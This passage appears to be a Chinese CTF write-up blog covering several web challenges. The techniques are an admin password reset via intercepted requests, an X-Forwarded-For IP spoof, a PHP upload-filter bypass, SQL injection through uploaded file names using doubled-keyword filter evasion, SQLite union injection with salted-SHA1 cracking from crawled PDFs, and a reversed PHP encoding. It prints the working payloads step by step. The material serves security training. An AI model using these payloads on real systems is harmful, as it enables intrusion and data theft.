<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"c"</span>).value;<br>    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>)<br>                <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>)<br>                    <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">"fl"</span>, <span class="hljs-string">"s_a"</span>, <span class="hljs-string">"i"</span>, <span class="hljs-string">"e&#125;"</span>];<br>                        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"_h0l"</span>, <span class="hljs-string">"n"</span>];<br>                        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">"g&#123;"</span>, <span class="hljs-string">"e"</span>, <span class="hljs-string">"_0"</span>];<br>                        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">"it'"</span>, <span class="hljs-string">"_"</span>, <span class="hljs-string">"n"</span>];<br>                        <span class="hljs-keyword">var</span> s = [t, n, r, i];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>                            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>                            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>                        &#125;<br>                    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);<br><span class="hljs-keyword">delete</span> _<br></code></pre></td></tr></table></figure>
<p>在console执行上述代码会得到一个只有输入框和按钮的空白页面，通过正则可以看出要匹配的输入。长度为16、以“be0f23”开头、以“e98aa”结尾、包含“233ac”和“c7be9”，满足条件的字符串只有“be0f233ac7be98aa”，输入后点击按钮得到flag。</p>
<p>或者从js可以看出if判断里面的代码输出和输入参数没有关系，直接在console中执行if里的代码也可以得到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;it&#39;s_a_h0le_in_0ne&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x010-bug"><a href="#0x010-bug" class="headerlink" title="0x010 bug"></a>0x010 bug</h2><p>注册一个用户，登录后“Manage”菜单无法访问，提示只有admin能访问。注销登录，选择“Findpwd”，在找回密码界面输入注册时的信息（地址信息随便填也行），然后进入到设置新密码界面，用“burpsuite”拦截设置新密码的请求，把“username”的值改为admin提交，就完成了admin的密码重置。</p>
<p>或者可以通过破解登录后的cookie中的user值，得到user=md5(uid:username)，uid在注册成功时的提示信息中（admin是1），计算得到admin的cookie为user=md5(“1:admin”)=4b9987ccafacb8d8fc08d22bbca797ba，访问个人信息页面并拦截修改uid为1、修改cookie的user值后可以得到admin的生日是“1993/01/01”，直接重置admin密码后重新登录。</p>
<p>使用admin和刚设置的新密码登录，选择“Manage”菜单，提示IP不允许。拦截请求添加头“X-Forwarded-For: 127.0.0.1”，访问后没有有效信息，查看网页代码，在注释里发现“index.php?module=filemanage&amp;do=???”。由“filemanage”猜测问号是“upload”，访问“index.php?module=filemanage&amp;do=upload”进入文件上传页面。</p>
<p>页面显示“Just image?”，上传一个png图片后提示“You know what I want!”，应该是需要绕过上传php文件。（以下操作可以用“burpsuite”拦截后使用“Repeater”进行）</p>
<ol>
<li>新建空白文本文件，修改文件扩展名为“.php”，上传空白php文件后提示“It is a php!”。</li>
<li>修改扩展名大小写提示信息没变，把扩展名改为“.php4”或“.php5”，提示信息“It is not a Image!”。</li>
<li>试了添加图片文件头提示信息没变，把上传的body中“Content-Type”的值改为“image/png”，提示信息“It is not a really php file”。</li>
<li>在空白文件中添加php一句话，提示信息“Something shows it is a php!”。</li>
<li>把php内容改为<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">"php"</span>&gt;<br>    随便写点什么<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
提交后返回flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;1344bc2fbb965810c007191488c31705&#125;<br></code></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="0x011-upload"><a href="#0x011-upload" class="headerlink" title="0x011 upload"></a>0x011 upload</h2><p>打开就是注册页面，随便注册一个账号登录，登录后是文件上传界面，通过测试发现只能上传.jpg文件，上传过的文件名会显示在网页上（退出重登也不会消失）,最新的在下面，上传满10个后再次上传会删除所有历史。猜测文件名可能存在sql注入。拦截上传请求后修改文件名进行测试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">"select,from,group_concat,information_schema,hex,substr,conv.jpg"</span>	=&gt;	<span class="hljs-string">",,group_concat,information_schema,hex,substr,conv.jpg"</span><br><span class="hljs-comment"># 会删除select和from关键词</span><br><br><span class="hljs-string">"seselectlect.jpg"</span>	=&gt; <span class="hljs-string">"select.jpg"</span><br><span class="hljs-comment"># 双写可以绕过关键词替换</span><br><br><span class="hljs-string">"'seselectlect.jpg"</span>	=&gt;	提示上传成功但是文件名回显失败<br><span class="hljs-comment"># 应该是破坏的insert语句的结构导致添加文件名失败</span><br><br><span class="hljs-comment"># insert语句结构应该是这样的：insert into 表名('filename',...) values('文件名',...);</span><br><span class="hljs-comment"># 注入的是insert语句而不是select语句</span><br><span class="hljs-string">"'+(seselectlect 1)+'.jpg"</span>	=&gt;	<span class="hljs-string">"1"</span><br><span class="hljs-string">"'+(seselectlect database())+'.jpg"</span>	=&gt;	<span class="hljs-string">"0"</span><br><span class="hljs-string">"'+(seselectlect 666)+'.jpg"</span>	=&gt;	<span class="hljs-string">"666"</span><br><span class="hljs-string">"'+(seselectlect 'aa')+'.jpg"</span>	=&gt;	<span class="hljs-string">"0"</span><br><span class="hljs-string">"'+(seselectlect '12a')+'.jpg"</span>	=&gt;	<span class="hljs-string">"12"</span><br><span class="hljs-string">"'+(seselectlect '12a34')+'.jpg"</span>	=&gt;	<span class="hljs-string">"12"</span><br><span class="hljs-comment"># “+”会把文件名当做十进制数来计算，遇到非数字字符就截断（空为0），同时会执行注入的sql语句</span><br><span class="hljs-comment"># 相当于执行 select (''+'dbname'+'.jpg'); 的结果为0</span><br><span class="hljs-comment"># 所以需要把select的结果转为10进制才能成功回显，而且不能超过15位数，否则会返回科学计数型的结果</span><br><span class="hljs-comment"># 明确了上述内容就可以构造有效的查询语句了</span><br><br><span class="hljs-comment"># 这里用到conv函数、substr函数和hex函数</span><br><span class="hljs-comment"># conv(N,from base ,to base)	例如：select conv('a',16,10)	=&gt;	10</span><br><span class="hljs-comment"># substr(string string,num start,num length)	例如：select substr('dbname',1,4)	=&gt;	'dbna'</span><br><span class="hljs-comment"># hex(string string)	例如：select hex('dbname')	=&gt;	'64626E616D65'</span><br><span class="hljs-comment"># 12位16进制转为10进制正好不超过15位数，而且12位16进制是偶数位不会把单个字符拆开（2个16进制对应1个字符），所以每12位hex查询一次</span><br><br><span class="hljs-string">"'+(seselectlect conv(substr(hex(database()),1,12),16,10))+'.jpg"</span><br><span class="hljs-comment"># substr:1,12 -&gt; 131277325825392 -&gt; 7765625f7570 -&gt; web_up</span><br><span class="hljs-comment"># substr:13,12 -&gt; 1819238756 -&gt; 6c6f6164 -&gt; load</span><br><span class="hljs-comment"># 所以库名是web_upload</span><br><br><span class="hljs-string">"'+(seselectlect conv(substr(hex(</span><br><span class="hljs-string">	(seselectlect table_name frfromom information_schema.tables where table_schema='web_upload' limit 0,1)</span><br><span class="hljs-string">),1,12),16,10))+'.jpg"</span><br><span class="hljs-comment"># 注意：此处内层查询需要套一层括号否则语句报错</span><br><span class="hljs-comment"># limit:0,1;substr:1,12 -&gt; 439855375731 -&gt; 66696c6573 -&gt; files</span><br><span class="hljs-comment"># limit:1,1;substr:1,12 -&gt; 114784820031327 -&gt; 68656c6c6f5f -&gt; hello_</span><br><span class="hljs-comment"># limit:1,1;substr:13,12 -&gt; 112615676665705 -&gt; 666c61675f69 -&gt; flag_i</span><br><span class="hljs-comment"># limit:1,1;substr:25,12 -&gt; 126853610566245 -&gt; 735f68657265 -&gt; s_here</span><br><span class="hljs-comment"># limit:1,1;substr:37,12 -&gt; 结果没有输出</span><br><span class="hljs-comment"># 所以保存文件名的表名应该是files，关键的表名是hello_flag_is_here</span><br><br><span class="hljs-string">"'+(seselectlect conv(substr(hex(</span><br><span class="hljs-string">	(seselectlect group_concat(column_name separator ',') frfromom information_schema.columns where table_name='hello_flag_is_here')</span><br><span class="hljs-string">),1,12),16,10))+'.jpg"</span><br><span class="hljs-comment"># substr:1,12 -&gt; 115858377367398 -&gt; 695f616d5f66 -&gt; i_am_f</span><br><span class="hljs-comment"># substr:13,12 -&gt; 7102823 -&gt; 6c6167 -&gt; lag</span><br><span class="hljs-comment"># 所以表hello_flag_is_here只有一列，列名是i_am_flag</span><br><br><span class="hljs-string">"'+(seselectlect conv(substr(hex(</span><br><span class="hljs-string">	(seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)</span><br><span class="hljs-string">),1,12),16,10))+'.jpg"</span><br><span class="hljs-comment"># substr:1,12 -&gt; 36427215695199 -&gt; 21215f406d5f -&gt; !!_@m_</span><br><span class="hljs-comment"># substr:13,12 -&gt; 92806431727430 -&gt; 54682e655f46 -&gt; Th.e_F</span><br><span class="hljs-comment"># substr:25,12 -&gt; 560750951 -&gt; 216c6167 -&gt; !lag</span><br><span class="hljs-comment"># 得到列值为!!_@m_Th.e_F!lag</span><br></code></pre></td></tr></table></figure>
<p>或者猜的够准，知道insert语句的完整结构可以直接注入，不必使用“+”拼接再转进制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 完整语句结构：insert into table values ('文件名','uid','uid')</span><br><span class="hljs-comment"># uid需要替换成当前用户的uid，uid在上传成功后返回的信息中</span><br><span class="hljs-string">"name','1660','1660'),((database()),'1660','1660')#.jpg"</span><br><span class="hljs-comment"># 库名：web_upload</span><br><br><span class="hljs-string">"name','1660','1660'),((seselectlect group_concat(table_name separator ',') frfromom information_schema.tables where table_schema='web_upload'),'1660','1660')#.jpg"</span><br><span class="hljs-comment"># 表名：files,hello_flag_is_here,members</span><br><br><span class="hljs-string">"name','1660','1660'),((seselectlect group_concat(column_name separator ',') frfromom information_schema.columns where table_name='hello_flag_is_here'),'1660','1660')#.jpg"</span><br><span class="hljs-comment"># 列名：i_am_flag</span><br><br><span class="hljs-string">"name','1660','1660'),((seselectlect group_concat(i_am_flag separator ',') frfromom hello_flag_is_here),'1660','1660')#.jpg"</span><br><span class="hljs-comment"># 列值：!!_@m_Th.e_F!lag</span><br></code></pre></td></tr></table></figure>
<p>最后提交的flag是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">!!_@m_Th.e_F!lag<br></code></pre></td></tr></table></figure>

<p>工具：<a href="http://tool.oschina.net/hexconvert/" target="_blank" rel="noopener">在线进制转换</a>、<a href="http://www.5ixuexiwang.com/str/from-hex.php" target="_blank" rel="noopener">在线16进制转文本</a></p>
<h2 id="0x012-FlatScience"><a href="#0x012-FlatScience" class="headerlink" title="0x012 FlatScience"></a>0x012 FlatScience</h2><p>网页上有很多链接，一层套一层，用代码遍历了一下目录没发现什么有用的东西（特殊url）。查看“robots.txt”，发现“/login.php”和“/admin.php”。在“login.php”的网页源码中发现注释信息“TODO: Remove ?debug-Parameter!”，在url中添加debug参数，发现返回了页面源码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'usr'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'pw'</span>]))&#123;<br>        $user = $_POST[<span class="hljs-string">'usr'</span>];<br>        $pass = $_POST[<span class="hljs-string">'pw'</span>];<br><br>        $db = <span class="hljs-keyword">new</span> SQLite3(<span class="hljs-string">'../fancy.db'</span>);<br>        <br>        $res = $db-&gt;query(<span class="hljs-string">"SELECT id,name from Users where name='"</span>.$user.<span class="hljs-string">"' and password='"</span>.sha1($pass.<span class="hljs-string">"Salz!"</span>).<span class="hljs-string">"'"</span>);<br>    <span class="hljs-keyword">if</span>($res)&#123;<br>        $row = $res-&gt;fetchArray();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;Some Error occourred!"</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($row[<span class="hljs-string">'id'</span>]))&#123;<br>            setcookie(<span class="hljs-string">'name'</span>,<span class="hljs-string">' '</span>.$row[<span class="hljs-string">'name'</span>], time() + <span class="hljs-number">60</span>, <span class="hljs-string">'/'</span>);<br>            header(<span class="hljs-string">"Location: /"</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'debug'</span>]))<br>highlight_file(<span class="hljs-string">'login.php'</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>由代码可以看出登录会执行sql查询，并将查询结果的name值添加到cookie中，通过拦截登录请求修改usr参数的值就能进行注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 原sql：&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;<br>usr&#x3D;&#39; union select name,sql from sqlite_master limit 1 offset 0--&amp;pw&#x3D;<br># 返回cookie中的结果需要urldecode<br># 返回：CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))<br># 表Users包含字段：id、name、password、hint<br><br>usr&#x3D;&#39; union select id,group_concat(id) from Users order by id--&amp;pw&#x3D;<br># 返回：1,2,3<br><br>usr&#x3D;&#39; union select id,group_concat(name) from Users order by id--&amp;pw&#x3D;<br># 返回：admin,fritze,hansi<br><br>usr&#x3D;&#39; union select id,group_concat(password) from Users order by id--&amp;pw&#x3D;<br># 返回：3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece82cf569f89507,34b0bb7c304949f9ff2fc101eef0f048be10d3bd<br><br>usr&#x3D;&#39; union select id,group_concat(hint) from Users order by id--&amp;pw&#x3D;<br># 返回：my fav word in my fav paper?!,my love is…?,the password is password<br># 至此得到了Users表所有的数据<br># 通过hint字段的提示信息，猜测密码在网页链接的pdf中（字符串），应该是需要解密admin的密码,然后登陆admin.php页面<br># 3fab54a50e770d830c0416df817567662a9dc85c:Salz!<br></code></pre></td></tr></table></figure>
<p>开始写的遍历脚本改动一下，加上读取pdf文本中单词，加盐sha1后的判断逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pip install pdfminer.six</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br><span class="hljs-keyword">from</span> pdfminer.pdfinterp <span class="hljs-keyword">import</span> PDFResourceManager, PDFPageInterpreter<br><span class="hljs-keyword">from</span> pdfminer.converter <span class="hljs-keyword">import</span> TextConverter<br><span class="hljs-keyword">from</span> pdfminer.layout <span class="hljs-keyword">import</span> LAParams<br><span class="hljs-keyword">from</span> pdfminer.pdfpage <span class="hljs-keyword">import</span> PDFPage<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert_pdf_2_text</span><span class="hljs-params">(path)</span>:</span><br>    rsrcmgr = PDFResourceManager()<br>    retstr = StringIO()<br>    device = TextConverter(rsrcmgr, retstr, codec=<span class="hljs-string">'utf-8'</span>, laparams=LAParams())<br>    interpreter = PDFPageInterpreter(rsrcmgr, device)<br>    <span class="hljs-comment"># 下载保存临时文件</span><br>    request.urlretrieve(path,<span class="hljs-string">"temp.pdf"</span>)<br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">"temp.pdf"</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> fp:<br>        <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> PDFPage.get_pages(fp, set()):<br>            interpreter.process_page(page)<br>        text = retstr.getvalue()<br>    device.close()<br>    retstr.close()<br>    <span class="hljs-keyword">return</span> text<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readpdf</span><span class="hljs-params">(url)</span>:</span><br>    pdf_text = convert_pdf_2_text(url).split(<span class="hljs-string">" "</span>)<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> pdf_text:<br>        sha1_password = hashlib.sha1((word+<span class="hljs-string">"Salz!"</span>).encode()).hexdigest()<br>        <span class="hljs-keyword">if</span> sha1_password == <span class="hljs-string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:<br>            print(<span class="hljs-string">"find the password :"</span> + word)<br>            exit()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">searchUrl</span><span class="hljs-params">(url)</span>:</span><br>    res = requests.get(url)<br>    soup = BeautifulSoup(res.text, <span class="hljs-string">"html.parser"</span>)<br>    alist = soup.find_all(<span class="hljs-string">"a"</span>)<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> alist:<br>        href = a.get(<span class="hljs-string">"href"</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">".pdf"</span> <span class="hljs-keyword">in</span> href:<br>            print(<span class="hljs-string">"find pdf: "</span>+url+href)<br>            readpdf(url+href)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">"index.html"</span> <span class="hljs-keyword">in</span> href:<br>            chref = href.replace(<span class="hljs-string">"../"</span>,<span class="hljs-string">""</span>).replace(<span class="hljs-string">"index.html"</span>,<span class="hljs-string">""</span>)<br>            <span class="hljs-keyword">if</span> len(chref) &gt; <span class="hljs-number">0</span>:<br>                searchUrl(url+href[:<span class="hljs-number">-10</span>])<br><br>searchUrl(<span class="hljs-string">"http://ip:port/"</span>)<br></code></pre></td></tr></table></figure>
<p>最后在文件“/1/2/5/98f13708210194c475687be6106a3b84.pdf”中发现匹配的密码：ThinJerboa，在admin.php登陆后返回flag（ID填admin）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;<br></code></pre></td></tr></table></figure>

<p>工具：<a href="http://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">在线url编码解码</a></p>
<h2 id="0x013-web2"><a href="#0x013-web2" class="headerlink" title="0x013 web2"></a>0x013 web2</h2><p>题目明确提示了解密就能获得flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span><span class="hljs-params">($str)</span></span>&#123;<br>    $_o=strrev($str);<br>    <span class="hljs-comment">// echo $_o;</span><br>        <br>    <span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;<br>       <br>        $_c=substr($_o,$_0,<span class="hljs-number">1</span>);<br>        $__=ord($_c)+<span class="hljs-number">1</span>;<br>        $_c=chr($__);<br>        $_=$_.$_c;   <br>    &#125; <br>    <span class="hljs-keyword">return</span> str_rot13(strrev(base64_encode($_)));<br>&#125;<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>代码中很多都是再次执行加密就会恢复的函数，如str_rot13()、strrev()，写出解密函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($str)</span></span>&#123;<br>	$_o=base64_decode(strrev(str_rot13($str)));<br>	<span class="hljs-comment">// for循环只有+1变成了-1，其他代码未变动</span><br>	<span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;<br>        $_c=substr($_o,$_0,<span class="hljs-number">1</span>);<br>        $__=ord($_c)<span class="hljs-number">-1</span>;<br>        $_c=chr($__);<br>        $_=$_.$_c;   <br>    &#125; <br>	<span class="hljs-keyword">return</span> strrev($_);<br>&#125;<br><br><span class="hljs-keyword">echo</span> decode($miwen);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>执行后输出flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;<br></code></pre></td></tr></table></figure>

<p>工具：<a href="http://www.dooccn.com/php/" target="_blank" rel="noopener">php代码在线测试</a></p>
<h2 id="0x014-PHP2"><a href="#0x014-PHP2" class="headerlink" title="0x014 PHP2"></a>0x014 PHP2</h2><p>打开页面后只有一句需要认证的提示，需要找到页面源码，本题用到了“.phps”后缀</p>
<blockquote>
<p>.phps后缀释义：<br>phps文件就是php的源代码文件。<br>通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替</p>
</blockquote>
<p>打开 index.phps 得到源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">if</span>(<span class="hljs-string">"admin"</span>===$_GET[id]) &#123;<br>	  <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);<br>	  <span class="hljs-keyword">exit</span>();<br>	&#125;<br><br>	$_GET[id] = urldecode($_GET[id]);<br>	<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"admin"</span>)<br>	&#123;<br>	  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;<br>	  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;<br>	&#125;<br><span class="hljs-meta">?&gt;</span><br><br>Can you anthenticate to this website?<br></code></pre></td></tr></table></figure>

